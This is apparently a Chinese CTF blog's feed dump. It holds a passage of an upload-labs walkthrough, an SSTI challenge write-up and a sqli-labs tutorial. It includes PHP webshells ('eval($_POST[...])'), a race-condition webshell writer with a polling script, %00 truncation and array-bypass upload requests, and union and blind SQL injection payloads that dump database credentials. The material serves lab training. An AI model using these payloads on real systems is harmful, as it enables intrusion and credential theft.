$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &#39;上传出错！&#39;;        }    } else{        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    }}</code></pre><blockquote><p>讲一下00截断的原理，在服务器读到十六进制编码为00时就会停止读取，而save_path是通过GET传参的00的GET传参的数据最终都会经过URL解码而%00解码之后就是十六进制对应的00，这就导致move_uploaded_file函数会读到00就结束从而上传成功</p></blockquote><p><code>.php%00</code></p><h1 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h1><p>代码和十二关一样，只是save_path改用POST传参了</p><p>burpsuite自带的16进制编辑器改16进制</p><p>找到文件名后缀后面的0被改为00</p><h1 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h1><pre><code class="php">function getReailFileType($filename){    $file = fopen($filename, &quot;rb&quot;);//以只读 二进制方式打开    $bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack(&quot;C2chars&quot;, $bin);//从二进制字符串对数据进行解包    //&#39;C2char&#39;的意思是二进制文件类型是&#39;unsigned char&#39;转换为char类型最终返回值是一个数组。之后将数组返还给$strinfo函数。    $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);//将$strinfo中的每一个元素转变为int型并且拼接输出给 $typeCode    $fileType = &#39;&#39;;        switch($typeCode){//switch匹配              case 255216:                        $fileType = &#39;jpg&#39;;            break;        case 13780:                        $fileType = &#39;png&#39;;            break;                case 7173:                        $fileType = &#39;gif&#39;;            break;        default:                        $fileType = &#39;unknown&#39;;        }            return $fileType;}$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;])){    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $file_type = getReailFileType($temp_file);    if($file_type == &#39;unknown&#39;){        $msg = &quot;文件未知，上传失败！&quot;;    }else{        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &quot;上传出错！&quot;;        }    }}</code></pre><p>这里本质上是检验的文件头</p><p>只要做个文件头正确的图片🐎即可</p><h1 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h1><pre><code class="php">function isImage($filename){    $types = &#39;.jpeg|.png|.gif&#39;;    if(file_exists($filename)){        $info = getimagesize($filename);//获取文件信息        $ext = image_type_to_extension($info[2]);//返回文件后缀        if(stripos($types,$ext)&gt;=0){            return $ext;        }else{            return false;        }    }else{        return false;    }}</code></pre><p>这里上传图片🐎即可</p><h1 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h1><pre><code class="php">$image_type = exif_imagetype($filename);</code></pre><p>这里的函数替代15关的</p><pre><code class="php">$info = getimagesize($filename);//获取文件信息$ext = image_type_to_extension($info[2]);//返回文件后缀</code></pre><p>还是图片🐎即可</p><h1 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h1><pre><code class="php">$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])){    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径    $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];    $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;];    $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename);    // 获得上传文件的扩展名    $fileext= substr(strrchr($filename,&quot;.&quot;),1);    //判断文件后缀与类型，合法才进行上传操作    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){        if(move_uploaded_file($tmpname,$target_path)){            //使用上传的图片生成新的图片            $im = imagecreatefromjpeg($target_path);            if($im == false){                $msg = &quot;该文件不是jpg格式的图片！&quot;;                @unlink($target_path);            }else{                //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.jpg&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;                imagejpeg($im,$img_path);                @unlink($target_path);                $is_upload = true;            }        } else {            $msg = &quot;上传出错！&quot;;        }    }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){        if(move_uploaded_file($tmpname,$target_path)){            //使用上传的图片生成新的图片            $im = imagecreatefrompng($target_path);            if($im == false){                $msg = &quot;该文件不是png格式的图片！&quot;;                @unlink($target_path);            }else{                 //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.png&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;                imagepng($im,$img_path);                @unlink($target_path);                $is_upload = true;                           }        } else {            $msg = &quot;上传出错！&quot;;        }    }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){        if(move_uploaded_file($tmpname,$target_path)){            //使用上传的图片生成新的图片            $im = imagecreatefromgif($target_path);            if($im == false){                $msg = &quot;该文件不是gif格式的图片！&quot;;                @unlink($target_path);            }else{                //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.gif&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;                imagegif($im,$img_path);                @unlink($target_path);                $is_upload = true;            }        } else {            $msg = &quot;上传出错！&quot;;        }    }else{        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;    }}</code></pre><p>这里进行了许多步过滤</p><p>简单总结下主要的就是</p><ol><li>对gif、png或jpg文件的格式进行二次渲染</li><li>根据上传的文件类型用imagecreatefromgif这一类的函数生成一个新的图片</li><li>将原本保存下的文件用unlink函数删除</li></ol><p>据师傅说<strong>直接用cmd命令行copy的文件也能成功上传</strong></p><p>也可以用010editor比较二次渲染前后的图片</p><p>蓝色的部分是未被改变的</p><p>可以在那里插入🐎</p><h1 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h1><pre><code class="php">$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;])){    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);    $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;    if(move_uploaded_file($temp_file, $upload_file)){        if(in_array($file_ext,$ext_arr)){             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        }else{            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;            unlink($upload_file);        }    }else{        $msg = &#39;上传出错！&#39;;    }}</code></pre><p>这里过滤的挺充分的</p><p>不过黑客大佬们还是有方法</p><p>原理简单来说是</p><ol><li>文件上传后到原文件被删除有一段时间</li><li>利用这段时间    重复发送写入木马的木马</li><li>然后不停访问原文件</li><li>访问成功后      木马也就被重新写入</li></ol><p>写入木马的木马</p><pre><code class="php">&lt;?php puts(fopen(&#39;shell.php&#39;,&#39;r+&#39;),&#39;&lt;? @eval($_POST[&#39;shell&#39;]);?&gt;&#39;);?&gt;//发送的木马</code></pre><p>重复发送利用burp实现</p><ol><li>用burpsuite抓包</li><li>调用intruder模块</li><li>打开payload板块设置payload type为null payloads</li><li>点击下方的continue indefinitely</li></ol><p>连续访问利用脚本实现</p><pre><code class="python">import requestsurl = &quot;http://ip/upload-labs/upload/shell.php&quot;while True:        html = requests.get(url)        if html.status_code == 200:            print(&quot;success&quot;)            break         else            print(&quot;200&quot;)</code></pre><h1 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h1><p>这一关和上面很像</p><p>不过python连续访问的url要变成</p><pre><code class="mathematica">127.0.0.1/upload-labs-master/include.php?file=upload/shell.jpg</code></pre><h1 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h1><p>这关绕过方法用之前的<code>.php.</code>就可以</p><p>不过这关和之前有个很明显的区别</p><p>做了个保存名称的input</p><pre><code class="php">$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);        $file_name = $_POST[&#39;save_name&#39;];        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);//在这里        if(!in_array($file_ext,$deny_ext)) {            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;            if (move_uploaded_file($temp_file, $img_path)) {                 $is_upload = true;            }else{                $msg = &#39;上传出错！&#39;;            }        }else{            $msg = &#39;禁止保存为该类型文件！&#39;;        }    } else {        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    }}</code></pre><h1 id="pass-21"><a href="#pass-21" class="headerlink" title="pass-21"></a>pass-21</h1><pre><code class="php">$is_upload = false;$msg = null;if(!empty($_FILES[&#39;upload_file&#39;])){    //检查MIME    $allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;);    if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type)){        $msg = &quot;禁止上传该类型文件!&quot;;    }else{        //检查文件名        $file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];        if (!is_array($file)) {            $file = explode(&#39;.&#39;, strtolower($file));            //explode(separator,string[,limit]) 函数，使用一个字符串分割另一个字符串，并返回由字符串组成的数组。        }        $ext = end($file);//end(array)函数，输出数组中的当前元素和最后一个元素的值。        $allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);        if (!in_array($ext, $allow_suffix)) {            $msg = &quot;禁止上传该后缀文件!&quot;;        }else{            $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];            //reset(array)函数，把数组的内部指针指向第一个元素，并返回这个元素的值            //count(array)函数，计算数组中的单元数目，或对象中的属性个数            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;            if (move_uploaded_file($temp_file, $img_path)) {                $msg = &quot;文件上传成功！&quot;;                $is_upload = true;            } else {                $msg = &quot;文件上传失败！&quot;;            }        }    }}else{    $msg = &quot;请选择要上传的文件！&quot;;}</code></pre><ol><li>验证上传路径是否存在验证[‘upload_file’]的content-type是否合法（可以抓包修改）</li><li>判断POST参数是否为空定义$file变量（关键：构造数组绕过下一步的判断）</li><li>判断file不是数组则使用explode(‘.’, strtolower($file))对file进行切割，将file变为一个数组</li><li>判断数组最后一个元素是否合法</li><li>数组第一位和<code>$file[count($file) - 1]</code>进行拼接，产生保存文件名file_name</li><li>上传文件</li></ol><p>这里可以用00截断</p><p>也可以用数组绕过</p><p>post包</p><pre><code class="css">-----------------------------131314876217456529963542266439Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;yijuhua.php&quot;Content-Type: image/png&lt;?php @eval($_POST[&#39;hack&#39;]);?&gt;-----------------------------131314876217456529963542266439Content-Disposition: form-data; name=&quot;save_name[0]&quot;upload-20.php-----------------------------131314876217456529963542266439Content-Disposition: form-data; name=&quot;save_name[2]&quot;jpg-----------------------------131314876217456529963542266439Content-Disposition: form-data; name=&quot;submit&quot;上传-----------------------------131314876217456529963542266439--</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;pass-01&quot;&gt;&lt;a href=&quot;#pass-01&quot; class=&quot;headerlink&quot; title=&quot;pass-01&quot;&gt;&lt;/a&gt;pass-01&lt;/h1&gt;&lt;p&gt;前端js过滤&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;function 
      
    
    </summary>
    
      <category term="ctf" scheme="/categories/ctf/"/>
    
    
      <category term="web" scheme="/tags/web/"/>
    
      <category term="upload" scheme="/tags/upload/"/>
    
      <category term="upload-labs" scheme="/tags/upload-labs/"/>
    
  </entry>
  
  <entry>
    <title>SSTI模板注入</title>
    <link href="/2022/08/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <id>/2022/08/SSTI模板注入/</id>
    <published>2022-08-29T10:18:54.833Z</published>
    <updated>2022-08-31T03:11:57.128Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://img-blog.csdnimg.cn/12ec799b41b544eb83db7a111956c0cb.png" alt="在这里插入图片描述"></p><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>ssti注入点在msg<br>注入49出现orz应该是有过滤<br>1正常<br>hint里缺cookie_secret<br>该项在handler.settings</p><blockquote><p>Handler这个对象，Handler指向的处理当前这个页面的RequestHandler对象<br>RequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性<br>handler 指向RequestHandler<br>而RequestHandler.settings又指向self.application.settings<br>所有handler.settings就指向RequestHandler.application.settings了！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/ac2991bc7e1e4e64b87451461cb17916.png" alt="在这里插入图片描述">然后按hint里的MD5加密过后传参<br><img src="https://img-blog.csdnimg.cn/3ee21ded82d8493baba4f8b5b940927a.png" alt="在这里插入图片描述"></p><pre><code class="shell">?filename=/fllllllllllllag&amp;filehash=ff92d5623223cadc00efabfc7676f9fe</code></pre><p>filehash不同 请自行加密<br><img src="https://img-blog.csdnimg.cn/c860336ae81a4d6e8c52328bf1ae378c.png" alt="在这里插入图片描述"></p><h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p><img src="https://img-blog.csdnimg.cn/ec82c70c7fdf49b698f9095bda0d1662.png" alt="在这里插入图片描述"></p><pre><code class="php">&lt;?php    require_once(&#39;header.php&#39;);    require_once(&#39;./libs/Smarty.class.php&#39;);    $smarty = new Smarty();    if (!empty($_SERVER[&#39;HTTP_CLIENT_IP&#39;]))     {           $ip=$_SERVER[&#39;HTTP_CLIENT_IP&#39;];    }    elseif (!empty($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))    {        $ip=$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];    }    else    {        $ip=$_SERVER[&#39;REMOTE_ADDR&#39;];    }    //$your_ip = $smarty-&gt;display(&quot;string:&quot;.$ip);    echo &quot;&lt;div class=\&quot;container panel1\&quot;&gt;                &lt;div class=\&quot;row\&quot;&gt;                &lt;div class=\&quot;col-md-4\&quot;&gt;                    &lt;/div&gt;                &lt;div class=\&quot;col-md-4\&quot;&gt;                &lt;div class=\&quot;jumbotron pan\&quot;&gt;                    &lt;div class=\&quot;form-group log\&quot;&gt;                        &lt;label&gt;&lt;h2&gt;Your IP is : &quot;;    $smarty-&gt;display(&quot;string:&quot;.$ip);    echo &quot;                &lt;/h2&gt;&lt;/label&gt;                    &lt;/div&gt;                        &lt;/div&gt;                &lt;/div&gt;                &lt;div class=\&quot;col-md-4\&quot;&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/div&gt;&quot;;    ?&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/eb0e52d7b7f74ac1bb74f7c38b4ca72f.png" alt="在这里插入图片描述"></p><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p><img src="https://img-blog.csdnimg.cn/f568432cbffb4e5f9603858a0cfa797d.png" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/12ec799b41b544eb83db7a111956c0cb.png&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;护网杯-2018-easy-tornado&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
      <category term="ctf" scheme="/categories/ctf/"/>
    
    
      <category term="web" scheme="/tags/web/"/>
    
      <category term="SSTI" scheme="/tags/SSTI/"/>
    
      <category term="模板注入" scheme="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqli-lab</title>
    <link href="/2022/08/sqli-lab/"/>
    <id>/2022/08/sqli-lab/</id>
    <published>2022-08-29T10:18:54.831Z</published>
    <updated>2022-08-31T03:11:52.617Z</updated>
    
    <content type="html"><![CDATA[<p>sql注入就是<br>当用户输入一些本不是用户名密码的sql语句<br>这些语句没有被过滤<br>执行后通过回显等方式，使注入者获得了数据库的信息</p><blockquote><p>  水了几天用来搞visual studio2022和Windows11所以本文略微简陋写，以后会完善<br>  visual studio2022版美化教程见<a href="https://blog.csdn.net/qq_62414126/article/details/121863518" target="_blank" rel="noopener">Visual Studio 2022界面美化教程</a>.</p></blockquote><h1 id="GET传参"><a href="#GET传参" class="headerlink" title="GET传参"></a>GET传参</h1><p>先放代码</p><pre><code class="php">&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variables if(isset($_GET[&#39;id&#39;])){$id=$_GET[&#39;id&#39;];//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);// connectivity //注意get传参获取到输入的id后先打开一个result.txt然后把你上传的写入到那个文件里这样你再一次操作后你就可以看到你的注入语句真正注进去的是啥了$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;//上面一行中$id前后的符号是关键，是注入语句闭合的符号$result=mysql_query($sql);$row = mysql_fetch_array($result);    if($row)    {          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;//正确回显颜色为绿色          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];          echo &quot;&lt;br&gt;&quot;;          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];          echo &quot;&lt;/font&gt;&quot;;      }      //这是输入正确时的反馈，直接把运行结果告诉你    但是后几关就不一样了    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;//报错回显为黄色        print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;      }    //这是输入错误时的反馈，把mysql_error反馈给你    同样，后几关也不一样了}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}//这是反馈你输入为空的?&gt;</code></pre><p>==/<em> </em>我为了让读者能看得更清晰，我将注释符的右半部分删去，就像这句一样没有<em> </em>/（你细品这句话 悖论）==<br>我第一个注释是：注意get传参，前10关前半部分代码不变<br>第二个注释是提示读者要注意每一关的闭合方式（包裹方式）<br>在if后else前是正确回显部分 在else后是错误回显部分<br>这两部分是区分注入方式所需要关注的</p><h2 id="先讲理论"><a href="#先讲理论" class="headerlink" title="==先讲理论=="></a>==先讲理论==</h2><p>根据两部分分别是否回显判断注入方式<br>注入方式包含联合查询、布尔盲注、时间盲注、报错注入等</p><h3 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h3><p>最基础的就是?id=1’、username=admin’这类传参语句，后面的’引号是闭合方式上面有讲，他用的啥符号闭合，你就要用相同的符号来闭合你的语句，输入这类最基础的注入语句来判断是否有报错回显 回显是黄色，代码段注释里有写</p><h3 id="判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数"><a href="#判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数" class="headerlink" title="判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数"></a>判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数</h3><pre><code class="sql">?id=1’ order by 1--+</code></pre><p>这里的省略号只要不报错 就加大数字，直到报错的前一个数字，就是回显的行数</p><h3 id="判断回显的数据是数据库中的哪几列"><a href="#判断回显的数据是数据库中的哪几列" class="headerlink" title="判断回显的数据是数据库中的哪几列"></a>判断回显的数据是数据库中的哪几列</h3><pre><code class="sql">?id=-1’ union select 1,2,3--+</code></pre><p>这里的数字的最大值要等与上一步得到的那个数<br>上一步7报错，那行数就是6，这一步就要1，2，3，4，5，6–+<br>看看那几个数字出现在你屏幕上了<br>要注意要id=一个不正确的值 如0，-1之类 这样联合查询之后的返回值会让union之后的查询语句的结果在数组的第一列，而后台php代码只会回显第一列的数据</p><h3 id="查库名"><a href="#查库名" class="headerlink" title="查库名"></a>查库名</h3><pre><code class="sql">?id=-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></pre><p>这里把查数据库的sql语句，替换掉出现在你屏幕上的一个数字 这里是3 来回显在屏幕上<br>group_concat(你要查询的数据）from 所在的库 表 列<br>这里查库名即查==schema_name== 这个数据被保存在==information_schema.schemata==<br>这样 回显的就是 数据库们 的名字</p><h3 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h3><pre><code class="sql">?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’–+</code></pre><p>table 表 information_schema.tables类比上面 table_schema=‘ 库名’<br>==这里你要猜一下==哪个数据库会放着你想要的数据，然后输在库名那个位置</p><h3 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h3><pre><code class="sql">?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’--+</code></pre><p>同样类比上面 column 列<br>==这里还要猜== 上面回显的哪个表里有你要的数据</p><h3 id="提取数据"><a href="#提取数据" class="headerlink" title="提取数据"></a>提取数据</h3><p>==激动人心的时候到了==</p><pre><code class="sql">?id=-1’ union select 1,2,group_concat(concat_ws(’~’,username,password)) from users–+</code></pre><p>同样类比上面 有一处特殊concat_ws(符号，列名，列名）<br>中间那个符号会被concat_ws插入到两组数据之间，就是为了方便看<br>这样就查到数据了，是不是很简单。</p><h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><p>limit是限制那一部分显示，limitx，y是从x+1开始显示y个</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><h3 id="正错回显都有"><a href="#正错回显都有" class="headerlink" title="正错回显都有"></a>正错回显都有</h3><p>就按上面的步骤一步一步找到数据<br>security———&gt;users——&gt;username&amp;password这就是靶场数据库的层次<br>图啥的以后再补</p><h2 id="理论进阶"><a href="#理论进阶" class="headerlink" title="==理论进阶=="></a>==理论进阶==</h2><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><pre><code class="php">?id=1’ and sleep (5)–+?id=1‘ and if((left((select schema_name from information_schema.schemata limit 4,1),1,1)=‘s’),1,sleep(3))–+</code></pre><p>这样的句子sleep()就是延时执行的意思，</p><blockquote><p>==让浏览器先睡一会==<br>当你想判断对不对的时候，你就让对的睡一会，错的继续肝，这样你就能看出来了</p></blockquote><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>下面几个方法各有优缺点<br>因为能知道sql-lab靶场数据库的数据<br>所以刷题时我多用left<br>实际</p><h4 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h4><p>substr(a,b,c)将a字段从第b个字符读取c个字符</p><h4 id="ascii"><a href="#ascii" class="headerlink" title="ascii"></a>ascii</h4><p>将括号中的字符转换为acsii码，再在最后进行值大小的判断，正确返回1，错误返回0</p><blockquote><p>类似于数学中的二分法</p><h4 id="left"><a href="#left" class="headerlink" title="left"></a>left</h4><p>left(a)从第一位开始读取a个字符</p></blockquote><h4 id="模糊查询-like"><a href="#模糊查询-like" class="headerlink" title="模糊查询 like"></a>模糊查询 like</h4><p>a like ‘%b%’ 判断a字符串里是否有b<br>a like ‘b%’ 判断a开头是否有 <del>b数</del></p><h4 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h4><p>regexp ‘a’正则表达式</p><blockquote><p>RegExp 对象表示正则表达式，它是对字符串执行模式匹配的强大工具 正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。<br>许多语言都有正则表达式<br>物理也有正则<br>所以正则是个啥(≧﹏ ≦)</p></blockquote><h2 id="实操进阶"><a href="#实操进阶" class="headerlink" title="实操进阶"></a>实操进阶</h2><h3 id="有报错回显-无正确回显"><a href="#有报错回显-无正确回显" class="headerlink" title="有报错回显 无正确回显"></a>有报错回显 无正确回显</h3><p>也就是说你在前四关能看见的绿字在5-8关用you are in替换了<br>也就是你之前查的库名 表名 列名 和数据不会回显了<br>当使用布尔盲注时 如果判断正确就会显示you are in<br>不正确的话就会报错<br>下图是第五关第一个用户名 最后一步注入语句<br>之前步骤参考第1到4关查各类信息的语句并用布尔盲注所用函数包装<img src="https://img-blog.csdnimg.cn/b430151e09e443ab9050d3d623a51bb0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><h3 id="正确回显和报错回显都没有"><a href="#正确回显和报错回显都没有" class="headerlink" title="正确回显和报错回显都没有"></a>正确回显和报错回显都没有</h3><p>不论你输入啥，他都会说you are in</p><blockquote><p>就像你说 ==啊对对对==</p></blockquote><p>这样 布尔盲注也没法用了<br>你不知道注入语句是对是错<br>这时就要用时间盲注了<br>把布尔盲注再进行包装<br>if(布尔盲注语句,sleep(3),1)<br>正确的话，浏览器会延时3秒再运行<br><img src="https://img-blog.csdnimg.cn/c5682cd2fa574b16bbae457ffa20e388.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><h1 id="POST传参"><a href="#POST传参" class="headerlink" title="POST传参"></a>POST传参</h1><h2 id="先讲理论-1"><a href="#先讲理论-1" class="headerlink" title="==先讲理论=="></a>==先讲理论==</h2><pre><code class="php+HTML">&lt;!--Form to post the data for sql injections Error based SQL Injection--&gt;&lt;form action=&quot;&quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;    &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;        &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;    &lt;/div&gt;      &lt;div&gt; Password  : &amp;nbsp;&amp;nbsp;&amp;nbsp;        &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;    &lt;/div&gt;&lt;/br&gt;    &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;    &lt;/div&gt;&lt;/form&gt;        ==上面是前端 通过post传参uname和passwd==&lt;?php// take the variablesif(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;])){    $uname=$_POST[&#39;uname&#39;];    $passwd=$_POST[&#39;passwd&#39;];/后端接收前端传的参数    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;User Name:&#39;.$uname);    fwrite($fp,&#39;Password:&#39;.$passwd.&quot;\n&quot;);    fclose($fp);// connectivity     @$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;    $result=mysql_query($sql);    $row = mysql_fetch_array($result);    if($row)    {          //echo &#39;&lt;font color= &quot;#0000ff&quot;&gt;&#39;;              echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#39;;        //echo &quot; You Have successfully logged in\n\n &quot; ;        echo &#39;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#39;;            echo &quot;&lt;br&gt;&quot;;        echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];        echo &quot;&lt;br&gt;&quot;;        echo &#39;Your Password:&#39; .$row[&#39;password&#39;];        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;/font&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#39;;            /又是这里分成两部分，上面是正确回显        下面是报错回显        echo &quot;&lt;/font&gt;&quot;;      }    else      {        echo &#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;;        //echo &quot;Try again 